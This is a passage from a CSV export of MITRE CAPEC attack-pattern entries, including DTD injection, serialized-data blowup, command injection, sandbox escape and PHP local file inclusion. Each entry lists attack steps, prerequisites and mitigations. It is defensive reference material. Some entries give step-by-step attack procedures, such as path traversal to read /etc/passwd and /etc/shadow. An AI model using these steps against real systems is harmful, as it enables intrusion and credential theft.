malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to their Twitter profile.::",::1021::,N/A,N/A,https://capec.mitre.org/data/definitions/222.html
CAPEC-224,Fingerprinting,Meta,Stable,"An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Most commonly, fingerprinting is done to determine operating system and application versions. Fingerprinting can be done passively as well as actively. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.",N/A,High,Very Low,N/A,N/A,::A means by which to interact with the target system directly.::,"::SKILL:Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument, or mouse clicking in the appropriate place on the screen.:LEVEL:Medium::","::If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::While some information is shared by systems automatically based on standards and protocols, remove potentially sensitive information that is not necessary for the application's functionality as much as possible.::",N/A,::200::,TAXONOMY NAME:WASC:ENTRY ID:45:ENTRY NAME:Fingerprinting::,N/A,https://capec.mitre.org/data/definitions/224.html
CAPEC-226,Session Credential Falsification through Manipulation,Detailed,Draft,An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server.,N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:196::,N/A,::The targeted application must use session credentials to identify legitimate users.::,N/A,"::An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.::",N/A,N/A,N/A,N/A,::565::472::,N/A,N/A,https://capec.mitre.org/data/definitions/226.html
CAPEC-228,DTD Injection,Detailed,Draft,"An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:250::NATURE:CanPrecede:CAPEC ID:197::NATURE:CanPrecede:CAPEC ID:491::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.TECHNIQUE:Examine any available documentation for the application that discusses expected XML input.:TECHNIQUE:Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.::STEP:3:PHASE:Exploit:DESCRIPTION:[Craft and inject XML containg malicious DTD payload]TECHNIQUE:Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.:TECHNIQUE:Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.::",::The target must be running an XML based application that leverages DTDs.::,N/A,N/A,N/A,N/A,::Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.::Implementation: Disallow the inclusion of DTDs as part of incoming messages.::Implementation: Use XML parsing tools that protect against DTD attacks.::,N/A,::829::,N/A,N/A,https://capec.mitre.org/data/definitions/228.html
CAPEC-229,Serialized Data Parameter Blowup,Detailed,Draft,"This attack exploits certain serialized data parsers (e.g., XML, YAML, etc.) which manage data in an inefficient manner. The attacker crafts an serialized data file with multiple configuration parameters in the same dataset. In a vulnerable parser, this results in a denial of service condition where CPU resources are exhausted because of the parsing algorithm. The weakness being exploited is tied to parser implementation and not language specific.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:231::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process requests using serialized data.TECHNIQUE:Use an automated tool to record all instances of URLs to process requests from serialized data.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests using serialized data.::STEP:2:PHASE:Exploit:DESCRIPTION:[Launch a Blowup attack] The attacker crafts malicious messages that contain multiple configuration parameters in the same dataset.TECHNIQUE:Send the malicious crafted message containing the multiple configuration parameters to the target URL, causing a denial of service.::",::The server accepts input in the form of serialized data and is using a parser with a runtime longer than O(n) for the insertion of a new configuration parameter in the data container.(examples are .NET framework 1.0 and 1.1)::,N/A,N/A,N/A,N/A,::This attack may be mitigated completely by using a parser that is not using a vulnerable container.::Mitigation may limit the number of configuration parameters per dataset.::,"::In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.::A YAML bomb leverages references within a YAML file to create exponential growth in memory requirements. By creating a chain of keys whose values are a list of multiple references to the next key in the chain, the amount of memory and processing required to handle the data grows exponentially. This may lead to denial of service or instability resulting from excessive resource consumption.::",::770::,TAXONOMY NAME:WASC:ENTRY ID:41:ENTRY NAME:XML Attribute Blowup::,N/A,https://capec.mitre.org/data/definitions/229.html
CAPEC-23,File Content Injection,Standard,Draft,"An adversary poisons files with a malicious payload (targeting the file systems accessible by the target software), which may be passed through by standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes, in order to exploit the host's trust in executing remote content, including binary files.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:242::NATURE:CanAlsoBe:CAPEC ID:165::,N/A,::The target software must consume files.::The adversary must have access to modify files that the target software will consume.::,"::SKILL:How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened.:LEVEL:Medium::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::Design: Enforce principle of least privilege::Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)::Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.::Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.::Implementation: Virus scanning on host::Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::","::PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.::",::20::,N/A,N/A,https://capec.mitre.org/data/definitions/23.html
CAPEC-230,Serialized Data with Nested Payloads,Standard,Draft,"Applications often need to transform data in and out of a data format (e.g., XML and YAML) by using a parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. By nesting these structures, causing the data to be repeatedly substituted, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization.",::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::,Medium,High,::NATURE:ChildOf:CAPEC ID:130::,::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by a data parser that supports using substitution on the victim's side.::STEP:2:PHASE:Exploit:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the parser when the data is parsed on the victim's system.::,::An application's user-controllable data is expressed in a language that supports subsitution.::An application does not perform sufficient validation to ensure that user-controllable data is not malicious.::,N/A,N/A,"::Bad data is passed to the data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::",::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,::Carefully validate and sanitize all user-controllable data prior to passing it to the data parser routine. Ensure that the resultant data is safe to pass to the data parser.::Perform validation on canonical data.::Pick a robust implementation of the data parser.::,N/A,::112::20::674::770::,N/A,N/A,https://capec.mitre.org/data/definitions/230.html
CAPEC-231,Oversized Serialized Data Payloads,Standard,Draft,"Applications often need to transform data in and out of serialized data formats, such as XML and YAML, by using a data parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. By supplying oversized payloads in input vectors that will be processed by the parser, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization, and potentially cause execution of arbitrary code. An adversary's goal is to leverage parser failure to their advantage. DoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious data payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.",::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::,Medium,High,::NATURE:ChildOf:CAPEC ID:130::,::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by an serialized data parser on the victim's side.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the data parser when the data is parsed on the victim's system.::,::An application uses an parser for serialized data to perform transformation on user-controllable data.::An application does not perform sufficient validation to ensure that user-controllable data is safe for a data parser.::,::SKILL:Denial of service:LEVEL:Low::SKILL:Arbitrary code execution:LEVEL:High::,N/A,"::Bad data is passed to the serialized data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::",::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,::Carefully validate and sanitize all user-controllable serialized data prior to passing it to the parser routine. Ensure that the resultant data is safe to pass to the parser.::Perform validation on canonical data.::Pick a robust implementation of the serialized data parser.::Validate data against a valid schema or DTD prior to parsing.::,N/A,::112::20::674::770::,N/A,"TYPE:Other:NOTE:In many cases this type of an attack will result in an XML Denial of Service (XDoS) or similar Denial of Service (DoS) due to an application becoming unstable, freezing, or crashing. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [REF-89].::::TYPE:Other:NOTE:The main weakness in serialized data related DoS is that the service provider generally must inspect, parse, and validate the data messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that DoS targets.::",https://capec.mitre.org/data/definitions/231.html
CAPEC-233,Privilege Escalation,Meta,Draft,An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,::269::1264::1311::,TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::,N/A,https://capec.mitre.org/data/definitions/233.html
CAPEC-234,Hijacking a privileged process,Standard,Draft,"An adversary gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:233::NATURE:CanFollow:CAPEC ID:242::NATURE:CanFollow:CAPEC ID:175::NATURE:CanFollow:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find process with elevated priveleges] The adversary probes for processes running with elevated privileges.TECHNIQUE:On Windows, use the process explorer's security tab to see if a process is running with administror privileges.:TECHNIQUE:On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find vulnerability in running process] The adversary looks for a vulnerability in the running process that would allow for arbitrary code execution with the privilege of the running process.TECHNIQUE:Look for improper input validation:TECHNIQUE:Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data.:TECHNIQUE:Utilize system utilities that support process control that have been inadequately secured::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute arbitrary code] The adversary exploits the vulnerability that they have found and hijacks the running process.::",::The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,N/A,N/A,N/A,::732::648::,N/A,N/A,https://capec.mitre.org/data/definitions/234.html
CAPEC-237,Escaping a Sandbox by Calling Code in Another Language,Detailed,Draft,"The attacker may submit malicious code of another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.",N/A,Low,Very High,::NATURE:ChildOf:CAPEC ID:480::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.TECHNIQUE:The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.::STEP:2:PHASE:Explore:DESCRIPTION:[Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.TECHNIQUE:The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.::STEP:3:PHASE:Experiment:DESCRIPTION:[Verify the exploitable security weaknesses] The attacker tries to craft malicious code of another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.TECHNIQUE:The attacker tries to explore the security weaknesses by calling malicious code of another language allowed by the sandbox.::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit the security weaknesses in the standard libraries] The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.TECHNIQUE:The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries.::",N/A,"::SKILL:The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography, the attacker needs to have an understand of these cryptographic operations in good detail.:LEVEL:High::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::,::Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.::Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.::Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.::Configuration: Get latest updates for the computer.::,"::Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named msits.exe, located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003.::",::693::,N/A,N/A,https://capec.mitre.org/data/definitions/237.html
CAPEC-24,Filter Failure through Buffer Overflow,Detailed,Draft,"In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).",N/A,High,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for inputs that involve potential filtering:TECHNIQUE:Brute force guessing of filtered inputs::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.TECHNIQUE:Brute force attack through black box penetration test tool.:TECHNIQUE:Fuzzing of communications protocols:TECHNIQUE:Manual testing of possible inputs with attack data.::STEP:3:PHASE:Experiment:DESCRIPTION:[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?TECHNIQUE:Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.:TECHNIQUE:Check Log files. An attacker with access to log files can look at the outcome of bad input.::STEP:4:PHASE:Exploit:DESCRIPTION:[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.TECHNIQUE:DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.:TECHNIQUE:Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.:TECHNIQUE:An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.::",::Ability to control the length of data passed to an active filter.::,::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::,N/A,::Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.::,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,"::Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.::Pre-design: Use a language or compiler that performs automatic bounds checking.::Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.::","::Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.::A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.::Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.::",::120::119::118::74::20::680::733::697::,N/A,N/A,https://capec.mitre.org/data/definitions/24.html
CAPEC-242,Code Injection,Meta,Stable,"An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.",N/A,High,High,N/A,N/A,"::The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.::",N/A,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Code Injection attack patterns can result in a wide variety of consequences and negatively affect all three elements of the security triad.::,"::Utilize strict type, character, and encoding enforcement::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::",N/A,::94::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Code Injection::,N/A,https://capec.mitre.org/data/definitions/242.html
CAPEC-248,Command Injection,Meta,Stable,"An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.",N/A,Medium,High,N/A,N/A,"::The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.::",N/A,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful command injection attack enables an adversary to alter the command being executed and achieve a variety of negative consequences depending on the makeup of the new command. This includes potential information disclosure or the corruption of application data.::,"::All user-controllable input should be validated and filtered for potentially unwanted characters. Using an allowlist for input is desired, but if use of a denylist approach is necessary, then focusing on command related terms and delimiters is necessary.::Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.::Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.::",N/A,::77::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Command Injection::,N/A,https://capec.mitre.org/data/definitions/248.html
CAPEC-25,Forced Deadlock,Meta,Stable,"The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.",N/A,Low,High,N/A,"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary initiates an exploratory phase to get familiar with the system.::STEP:2:PHASE:Explore:DESCRIPTION:The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.::STEP:3:PHASE:Explore:DESCRIPTION:If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.::","::The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [REF-101]::The target host exposes an API to the user.::",::SKILL:This type of attack may be sophisticated and require knowledge about the system's resources and APIs.:LEVEL:Medium::,N/A,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption A successful forced deadlock attack compromises the availability of the system by exhausting its available resources.::,"::Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).::For competing actions, use well-known libraries which implement synchronization.::","::An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)::",::412::567::662::667::833::1322::,N/A,N/A,https://capec.mitre.org/data/definitions/25.html
CAPEC-250,XML Injection,Standard,Draft,"An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.",N/A,High,N/A,::NATURE:ChildOf:CAPEC ID:248::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the Target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XML queriesTECHNIQUE:Use an automated tool to record all instances of user-controllable input used to contruct XML queries.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes inputs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine the Structure of Queries] Using manual or automated means, test inputs found for XML weaknesses.TECHNIQUE:Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results and identify improper input validation.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject Content into XML Queries] Craft malicious content containing XML expressions that is not validated by the application and is executed as part of the XML queries.TECHNIQUE:Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.::",::XML queries used to process user input and retrieve information stored in XML documents::User-controllable input not properly sanitized::,::SKILL:An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection:LEVEL:Low::,::None: No specialized resources are required to execute this type of attack.::,::Too many exceptions generated by the application as a result of malformed queries::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::,::Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.::,::91::74::20::707::,TAXONOMY NAME:WASC:ENTRY ID:23:ENTRY NAME:XML Injection::,N/A,https://capec.mitre.org/data/definitions/250.html
CAPEC-251,Local Code Inclusion,Standard,Stable,"The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:175::,N/A,::The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.::Some variants of this attack may require that old versions of some code files be present and in predictable locations.::,N/A,"::The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.::",N/A,"::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands Through local code inclusion, the adversary compromises the integrity of the application.::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes.::","::Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement a specific, allowlist approach.::",N/A,::829::,TAXONOMY NAME:ATTACK:ENTRY ID:1055:ENTRY NAME:Process Injection::,N/A,https://capec.mitre.org/data/definitions/251.html
CAPEC-252,PHP Local File Inclusion,Detailed,Draft,"The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:251::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find. The adversary is looking for URLs that show PHP file inclusion is used, which can look something like http://vulnerable-website/file.php?file=index.php.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt variations on input parameters] Once the adversary finds a vulnerable URL that takes file input, they attempt a variety of path traversal techniques to attempt to get the application to display the contents of a local file, or execute a different PHP file already stored locally on the server.TECHNIQUE:Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of path traversal techniques used to include well known files.:TECHNIQUE:Use a proxy tool to record results of manual input of local file inclusion probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:[Include desired local file] Once the adversary has determined which techniques of path traversal successfully work with the vulnerable PHP application, they will target a specific local file to include. These can be files such as /etc/passwd, /etc/shadow, or configuration files for the application that might expose sensitive information.::",::The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.::,N/A,::The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.::,N/A,N/A,N/A,N/A,::829::,N/A,N/A,https://capec.mitre.org/data/definitions/252.html
